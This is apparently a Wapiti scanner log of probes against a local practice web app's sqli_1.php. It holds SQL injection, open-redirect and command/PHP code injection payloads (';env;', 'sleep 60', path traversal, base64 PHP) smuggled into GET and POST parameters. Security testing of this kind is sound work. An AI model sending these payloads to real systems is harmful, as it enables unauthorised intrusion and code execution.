+2024-03-20 16:41:25.173 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/sqli_1.php?title=fuzz&action=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 16:41:25.224 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%20AND%2086%3D156%20AND%2092%3D92 (0)
+2024-03-20 16:41:25.283 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%27%20AND%2074%3D167%20AND%20%2734%27%3D%2734 (0)
+2024-03-20 16:41:25.315 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%22%20AND%2084%3D144%20AND%20%2288%22%3D%2288 (0)
+2024-03-20 16:41:25.347 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%29%20AND%2090%3D178%20AND%20%2881%3D81 (0)
+2024-03-20 16:41:25.377 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%27%29%20AND%2023%3D71%20AND%20%28%2778%27%3D%2778 (0)
+2024-03-20 16:41:25.409 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%22%29%20AND%2034%3D110%20AND%20%28%2218%22%3D%2218 (0)
+2024-03-20 16:41:25.447 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:25.447 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/sqli_1.php?title=default&action=search%C2%BF%27%22%28 (1)
+2024-03-20 16:41:25.479 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%20AND%2044%3D108%20AND%2036%3D36&action=search (1)
+2024-03-20 16:41:25.507 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%27%20AND%2038%3D52%20AND%20%2789%27%3D%2789&action=search (1)
+2024-03-20 16:41:25.536 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%22%20AND%2011%3D21%20AND%20%2250%22%3D%2250&action=search (1)
+2024-03-20 16:41:25.568 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%29%20AND%2043%3D124%20AND%20%2843%3D43&action=search (1)
+2024-03-20 16:41:25.602 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%27%29%20AND%2026%3D40%20AND%20%28%2733%27%3D%2733&action=search (1)
+2024-03-20 16:41:25.615 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%27%29%20AND%2036%3D102%20AND%20%28%2710%27%3D%2710&action=search (1)
+2024-03-20 16:41:25.628 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%27%29%20AND%2011%3D11%20AND%20%28%2759%27%3D%2759&action=search (1)
+2024-03-20 16:41:25.645 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default%22%29%20AND%2042%3D58%20AND%20%28%2234%22%3D%2234&action=search (1)
+2024-03-20 16:41:25.709 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%20AND%2031%3D41%20AND%2056%3D56 (1)
+2024-03-20 16:41:25.741 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%27%20AND%2061%3D137%20AND%20%2726%27%3D%2726 (1)
+2024-03-20 16:41:25.774 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%22%20AND%2020%3D59%20AND%20%2242%22%3D%2242 (1)
+2024-03-20 16:41:25.807 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%29%20AND%2079%3D154%20AND%20%2822%3D22 (1)
+2024-03-20 16:41:25.900 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%27%29%20AND%2047%3D66%20AND%20%28%2740%27%3D%2740 (1)
+2024-03-20 16:41:25.933 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_1.php?title=default&action=search%22%29%20AND%2068%3D81%20AND%20%28%2238%22%3D%2238 (1)
+2024-03-20 16:41:25.975 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:26.008 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:26.008 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
+2024-03-20 16:41:26.018 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
+2024-03-20 16:41:26.035 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%20AND%2081%3D151%20AND%2038%3D38&security_level=2
+2024-03-20 16:41:26.041 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%27%20AND%2077%3D167%20AND%20%2781%27%3D%2781&security_level=2
+2024-03-20 16:41:26.048 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%22%20AND%2029%3D121%20AND%20%2249%22%3D%2249&security_level=2
+2024-03-20 16:41:26.054 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%29%20AND%2026%3D107%20AND%20%2810%3D10&security_level=2
+2024-03-20 16:41:26.060 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%27%29%20AND%2045%3D89%20AND%20%28%2757%27%3D%2757&security_level=2
+2024-03-20 16:41:26.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%22%29%20AND%2046%3D78%20AND%20%28%2275%22%3D%2275&security_level=2
+2024-03-20 16:41:26.073 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%20AND%2063%3D129%20AND%2025%3D25
+2024-03-20 16:41:26.080 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%27%20AND%2096%3D130%20AND%20%2774%27%3D%2774
+2024-03-20 16:41:26.087 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%22%20AND%2078%3D119%20AND%20%2285%22%3D%2285
+2024-03-20 16:41:26.094 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%29%20AND%2014%3D62%20AND%20%2855%3D55
+2024-03-20 16:41:26.100 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%27%29%20AND%2072%3D83%20AND%20%28%2729%27%3D%2729
+2024-03-20 16:41:26.106 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%22%29%20AND%2038%3D137%20AND%20%28%2248%22%3D%2248
+2024-03-20 16:41:26.122 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:26.122 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%C2%BF%27%22%28&bug=13
+2024-03-20 16:41:26.132 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%C2%BF%27%22%28
+2024-03-20 16:41:26.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%20AND%2093%3D167%20AND%2042%3D42&bug=13
+2024-03-20 16:41:26.163 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27%20AND%2010%3D80%20AND%20%2759%27%3D%2759&bug=13
+2024-03-20 16:41:26.175 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22%20AND%2066%3D142%20AND%20%2296%22%3D%2296&bug=13
+2024-03-20 16:41:26.187 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%29%20AND%2039%3D80%20AND%20%2856%3D56&bug=13
+2024-03-20 16:41:26.199 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27%29%20AND%2081%3D159%20AND%20%28%2727%27%3D%2727&bug=13
+2024-03-20 16:41:26.211 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22%29%20AND%2058%3D72%20AND%20%28%2264%22%3D%2264&bug=13
+2024-03-20 16:41:26.223 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%20AND%2088%3D171%20AND%2089%3D89
+2024-03-20 16:41:26.235 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%20AND%2069%3D109%20AND%2069%3D69
+2024-03-20 16:41:26.248 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%20AND%2018%3D18%20AND%2076%3D76
+2024-03-20 16:41:26.260 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%20AND%2022%3D64%20AND%20%2784%27%3D%2784
+2024-03-20 16:41:26.273 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%20AND%2028%3D84%20AND%20%2733%27%3D%2733
+2024-03-20 16:41:26.285 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%20AND%2039%3D39%20AND%20%2754%27%3D%2754
+2024-03-20 16:41:26.297 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%20AND%2087%3D164%20AND%20%2265%22%3D%2265
+2024-03-20 16:41:26.310 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%20AND%2090%3D170%20AND%20%2272%22%3D%2272
+2024-03-20 16:41:26.323 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%20AND%2019%3D19%20AND%20%2290%22%3D%2290
+2024-03-20 16:41:26.336 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%29%20AND%2022%3D83%20AND%20%2852%3D52
+2024-03-20 16:41:26.349 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%29%20AND%2064%3D162%20AND%20%2855%3D55
+2024-03-20 16:41:26.362 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%29%20AND%2041%3D41%20AND%20%2886%3D86
+2024-03-20 16:41:26.375 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%29%20AND%2075%3D114%20AND%20%28%2777%27%3D%2777
+2024-03-20 16:41:26.390 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%29%20AND%2043%3D137%20AND%20%28%2762%27%3D%2762
+2024-03-20 16:41:26.402 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%27%29%20AND%2054%3D54%20AND%20%28%2726%27%3D%2726
+2024-03-20 16:41:26.414 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%29%20AND%2062%3D154%20AND%20%28%2227%22%3D%2227
+2024-03-20 16:41:26.425 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%29%20AND%2073%3D109%20AND%20%28%2288%22%3D%2288
+2024-03-20 16:41:26.436 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%22%29%20AND%2044%3D44%20AND%20%28%2223%22%3D%2223
+2024-03-20 16:41:26.473 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:41:26.550 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:41:26.566 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:26.566 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=https%3A%2F%2Fopenbugbounty.org%2F&action=search
+2024-03-20 16:41:26.610 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=%2F%2Fopenbugbounty.org%2F&action=search
+2024-03-20 16:41:26.654 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:41:26.696 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=fuzz&action=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:41:26.756 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:26.757 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=default&action=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:41:26.804 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=default&action=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:41:26.865 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:26.890 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:41:26.906 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:26.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Benv%3B&action=search (0)
+2024-03-20 16:41:26.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%7Cenv%7C&action=search (0)
+2024-03-20 16:41:26.943 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Benv%3B&action=search (0)
+2024-03-20 16:41:26.959 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Benv%3B&action=search (0)
+2024-03-20 16:41:26.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=search (0)
+2024-03-20 16:41:26.991 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz%3Benv%3B&action=search (0)
+2024-03-20 16:41:27.007 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz%0Aenv%3B&action=search (0)
+2024-03-20 16:41:27.021 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%26set%26&action=search (0)
+2024-03-20 16:41:27.031 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=set&action=search (0)
+2024-03-20 16:41:27.041 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=env&action=search (0)
+2024-03-20 16:41:27.052 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%2Fe%00&action=search (0)
+2024-03-20 16:41:27.063 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.072 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.080 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.089 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.106 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.114 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.122 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.131 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.143 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.155 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
+2024-03-20 16:41:27.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
+2024-03-20 16:41:27.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=search (0)
+2024-03-20 16:41:27.181 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%60%29%60&action=search (0)
+2024-03-20 16:41:27.190 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%60sleep%2060%60&action=search (0)
+2024-03-20 16:41:27.201 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bsleep%2060%3B&action=search (0)
+2024-03-20 16:41:27.211 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%7Csleep%2060%3B&action=search (0)
+2024-03-20 16:41:27.221 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%26ping%20-n%2025%20127.0.0.1%26&action=search (0)
+2024-03-20 16:41:27.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Benv%3B (0)
+2024-03-20 16:41:27.246 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%7Cenv%7C (0)
+2024-03-20 16:41:27.256 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Benv%3B (0)
+2024-03-20 16:41:27.266 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Benv%3B (0)
+2024-03-20 16:41:27.275 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 16:41:27.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%3Benv%3B (0)
+2024-03-20 16:41:27.298 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%0Aenv%3B (0)
+2024-03-20 16:41:27.314 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%26set%26 (0)
+2024-03-20 16:41:27.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=set (0)
+2024-03-20 16:41:27.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=env (0)
+2024-03-20 16:41:27.345 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fe%00 (0)
+2024-03-20 16:41:27.354 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.364 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.383 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.394 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.414 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.423 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.451 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:41:27.460 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:41:27.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 16:41:27.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%60%29%60 (0)
+2024-03-20 16:41:27.492 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%60sleep%2060%60 (0)
+2024-03-20 16:41:27.502 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bsleep%2060%3B (0)
+2024-03-20 16:41:27.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%7Csleep%2060%3B (0)
+2024-03-20 16:41:27.521 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 16:41:27.539 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:27.541 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Benv%3B (1)
+2024-03-20 16:41:27.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%7Cenv%7C (1)
+2024-03-20 16:41:27.559 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Benv%3B (1)
+2024-03-20 16:41:27.570 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Benv%3B (1)
+2024-03-20 16:41:27.582 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
+2024-03-20 16:41:27.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=search%3Benv%3B (1)
